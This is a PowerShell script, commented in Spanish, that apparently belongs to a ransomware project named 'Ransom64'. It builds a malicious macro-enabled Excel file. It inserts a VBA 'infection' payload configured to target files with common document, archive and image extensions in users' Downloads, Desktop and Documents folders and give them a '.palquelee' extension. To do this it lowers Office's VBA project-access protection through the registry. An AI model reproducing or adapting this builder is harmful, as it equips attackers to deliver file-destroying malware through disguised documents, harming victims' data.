# Este codigo permite generar el LNK de infección
# Los parámetros de configuracion están en el archivo VBA asociado

 param (
    [string]$file_input = "Text.xlsx"
 )

#####
# VARIABLES PARA CONFIGURAR
$dirs = "(Downloads|Desktop|Documents)"
$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
$final_ext = ".palquelee"
$file_output = (Split-Path $file_input -Leaf).Replace("xlsx","xlsm") # Nombre del archivo final
$file_image = "bg.jpg" # Nombre de la imagen a embeber
#####
#####


#####
# Entorno
$base = $PSScriptRoot+"\";
if($base -eq "\"){$base = "C:\Users\cbcl\Downloads\Ransom64-main\"}
$output = $base + "output\";
$payloads = $base + "payloads\";
if((Test-Path $output) -eq $false){New-Item -ItemType Directory $output}
if((Test-Path $payloads) -eq $false){New-Item -ItemType Directory $payloads}
#####
#####
# Archivos con el payload y el output
$archivo = "MiInfeccion.vba" # Nombre del archivo con código VBA para el Excel
#####

#####
# Inicio de código
$cont = Get-Content -Raw $payloads$archivo;
# Reemplazo de Variables
$ext = "\.(" + ($ext -join "|" -replace "\.","") + ")$"
$cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
$cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
$cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)

# Abrimos una instancia de la aplicación Excel.
$excel = New-Object -ComObject Excel.Application;
$excel.Visible = $false;
$excel.DisplayAlerts = $false

# Codigo usado la primera vez, para setear el acceso por Powershell al código de VBA de Excel.
$ExcelVersion = $excel.Version
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -Value 1 -Force | Out-Null 

#open file
if((Test-Path $file_input) -eq $false){Write-Host "ERROR: No esta el archivo: "$file_input; return}
$workbook = $excel.Workbooks.Open($file_input)

# Agregando la foto de fondo de pantalla (puede ir donde sea, mientras sea 1 foto agregada en "Shapes"
$sheet = $workbook.worksheets.Item(1);
$sheet.Shapes.AddPicture(($file_input), 0, -1,30000,30000,-1,-1) | Out-Null

# Agregando el código VBA que tengo en un archivo aparte.
#$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromFile($payloads + $archivo);
$test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromString($cont);

# Guardando el archivo como .xlsm
$workbook.SaveAs($output + $file_output, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLWorkbookMacroEnabled );

# Force Close para no infectarse en la creación
$excel.Visible = $true;
$process = Get-Process Excel | Where-Object {$_.MainWindowHandle -eq $excel.Hwnd}
Stop-Process -id $process.Id
